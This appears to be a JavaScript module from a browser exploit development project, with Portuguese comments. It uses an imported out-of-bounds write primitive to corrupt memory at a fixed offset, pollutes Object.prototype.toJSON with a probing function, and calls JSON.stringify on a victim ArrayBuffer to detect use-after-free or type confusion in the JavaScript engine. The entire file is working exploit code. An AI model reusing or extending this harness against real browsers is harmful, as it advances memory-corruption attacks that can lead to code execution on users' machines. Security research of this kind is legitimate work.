// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const TARGETED_UAF_TC_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    // value_to_write será passado como parâmetro para executeUAFTypeConfusionTestWithValue
    bytes_to_write_for_corruption: 4,
    ppKeyToPollute: 'toJSON',
};

export let currentCallCount_for_UAF_TC_test = 0;
const MAX_toJSON_DEPTH_FOR_ANALYSIS = 10; // Limite de profundidade para detailed_toJSON

export function detailed_toJSON_for_UAF_TC_test_WithDepthControl() {
    currentCallCount_for_UAF_TC_test++;
    const currentOperationThis = this;
    const FNAME_toJSON_local = `detailed_toJSON_DepthCtrl(Call ${currentCallCount_for_UAF_TC_test})`;

    if (currentCallCount_for_UAF_TC_test === 1) {
        document.title = `detailed_toJSON Call ${currentCallCount_for_UAF_TC_test}`;
    }
    
    // Logar para todas as chamadas até o limite de profundidade
    if (currentCallCount_for_UAF_TC_test <= MAX_toJSON_DEPTH_FOR_ANALYSIS) {
        logS3(`[toJSON Poluído - Detalhado c/ Profundidade] ${FNAME_toJSON_local} Chamado!`, "vuln");
        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
    }

    // Se exceder a profundidade, retorna undefined para parar a recursão
    if (currentCallCount_for_UAF_TC_test > MAX_toJSON_DEPTH_FOR_ANALYSIS) {
        if (currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS + 1) { // Logar apenas uma vez ao atingir o limite
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Profundidade máxima (${MAX_toJSON_DEPTH_FOR_ANALYSIS}) atingida. Retornando undefined.`, "info");
            document.title = `toJSON Profundidade Máx Atingida (${MAX_toJSON_DEPTH_FOR_ANALYSIS})`;
        }
        return undefined; 
    }

    let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A", type_toString: "N/A" };
    let error_accessing_props = null;
    try {
        details.type_toString = Object.prototype.toString.call(currentOperationThis);
        details.byteLength = currentOperationThis.byteLength; 

        if (currentOperationThis && typeof details.byteLength === 'number' && details.byteLength >= 4) {
            if (currentOperationThis instanceof ArrayBuffer) {
                details.first_dword = new DataView(currentOperationThis, 0, 4).getUint32(0, true);
            } else if (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined && (currentOperationThis.buffer.byteLength >= currentOperationThis.byteOffset + 4) ) {
                details.first_dword = new DataView(currentOperationThis.buffer, currentOperationThis.byteOffset, 4).getUint32(0, true);
            }
        }
        details.slice_exists = (typeof currentOperationThis.slice === 'function');
        
        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Detalhes: type='${details.type_toString}', byteLength=${details.byteLength}, 1stDword=${(details.first_dword === "N/A" || typeof details.first_dword === 'string') ? details.first_dword : toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info");
        
    } catch (e) {
        error_accessing_props = e.message;
        logS3(`  [toJSON Poluído - Detalhado c/ Profundidade] ${FNAME_toJSON_local} ERRO ao acessar props: ${e.message}`, "critical");
        document.title = `ERRO toJSON Props Call ${currentCallCount_for_UAF_TC_test}`;
    }
    
    if (error_accessing_props) {
        return { toJSON_prop_error: true, message: error_accessing_props, call: currentCallCount_for_UAF_TC_test, details_at_error: details };
    }
    // Continua retornando um objeto que pode ser serializado para manter a cadeia, até o limite de profundidade
    return { toJSON_executed_detailed_depth_ctrl: true, call: currentCallCount_for_UAF_TC_test, details: details };
}


export async function executeUAFTypeConfusionTestWithValue(
    testVariantDescription,
    valueToWriteOOB
    // A função toJSON a ser usada será detailed_toJSON_for_UAF_TC_test_WithDepthControl
) {
    const FNAME_TEST = `executeUAFTypeConfusionTest<${testVariantDescription}>`;
    const {
        victim_ab_size,
        corruption_offset, // Usará o 0x70 fixo dos TARGETED_UAF_TC_PARAMS
        bytes_to_write_for_corruption,
        ppKeyToPollute,
    } = TARGETED_UAF_TC_PARAMS;

    logS3(`--- Iniciando Teste UAF/TC (Controle de Profundidade): ${testVariantDescription} ---`, "test", FNAME_TEST);
    logS3(`   Offset: ${toHex(corruption_offset)}, Valor OOB: ${toHex(valueToWriteOOB)}`, "info", FNAME_TEST);
    document.title = `Iniciando UAF/TC DepthCtrl: ${testVariantDescription}`;

    currentCallCount_for_UAF_TC_test = 0; 

    let stringifyResult = null; 
    let errorOccurredInStringify = false;
    let potentiallyFroze = true; 
    let stepReached = "inicio";

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return { potentiallyFroze: false, errorOccurred: true, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
    }
    document.title = "OOB Configurado";
    stepReached = "oob_configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_TEST);
    stepReached = "vitima_criada";

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
    let pollutionAppliedThisRun = true; 
    
    try {
        logS3(`Aplicando PP com detailed_toJSON_for_UAF_TC_test_WithDepthControl...`, "info", FNAME_TEST);
        document.title = `Aplicando PP DepthCtrl: ${testVariantDescription}`;
        stepReached = "aplicando_pp";
        Object.defineProperty(Object.prototype, ppKeyToPollute, {
            value: detailed_toJSON_for_UAF_TC_test_WithDepthControl, 
            writable: true, configurable: true, enumerable: false
        });
        logS3(`Object.prototype.${ppKeyToPollute} poluído com controle de profundidade.`, "good", FNAME_TEST);
        stepReached = "pp_aplicada";
        document.title = `PP Aplicada DepthCtrl: ${testVariantDescription}`;

        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(valueToWriteOOB)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
        stepReached = "antes_escrita_oob";
        document.title = `Antes Escrita OOB DepthCtrl: ${testVariantDescription}`;
        oob_write_absolute(corruption_offset, valueToWriteOOB, bytes_to_write_for_corruption);
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita OOB DepthCtrl: ${testVariantDescription}`;
        
        await PAUSE_S3(SHORT_PAUSE_S3); 

        stepReached = "antes_stringify";
        document.title = `Antes Stringify DepthCtrl: ${testVariantDescription}`;
        logS3(`Chamando JSON.stringify(victim_ab)...`, "info", FNAME_TEST);
        
        try {
            stringifyResult = JSON.stringify(victim_ab); 
            stepReached = "apos_stringify";
            document.title = `Stringify Retornou DepthCtrl: ${testVariantDescription}`;
            potentiallyFroze = false; 
            logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 500)}`, "info", FNAME_TEST);
            if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_prop_error:true")) {
                logS3("UAF/TC POTENCIALMENTE DETECTADO: Erro ao acessar propriedade dentro do toJSON.", "vuln", FNAME_TEST);
            }
        } catch (e) {
            stepReached = "erro_stringify";
            document.title = `ERRO Stringify (${e.name}) DepthCtrl: ${testVariantDescription}`;
            potentiallyFroze = false; 
            errorOccurredInStringify = true;
            logS3(`ERRO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME_TEST);
            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e);
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal DepthCtrl: ${testVariantDescription}`;
        potentiallyFroze = false;
        errorOccurredInStringify = true; 
        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        if (pollutionAppliedThisRun) { 
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKeyToPollute];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
        if (potentiallyFroze) {
            logS3(`O TESTE PODE TER CONGELADO. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}`, "warn", FNAME_TEST);
            document.title = `CONGELOU? Passo: ${stepReached} - Chamadas: ${currentCallCount_for_UAF_TC_test} - ${testVariantDescription}`;
        }
    }
    logS3(`--- Teste UAF/TC Concluído: ${testVariantDescription} (Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}) ---`, "test", FNAME_TEST);
    if (!potentiallyFroze && !errorOccurredInStringify) {
        document.title = `Teste UAF/TC DepthCtrl OK: ${testVariantDescription}`;
    }
    return { potentiallyFroze, errorOccurred: errorOccurredInStringify, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
}
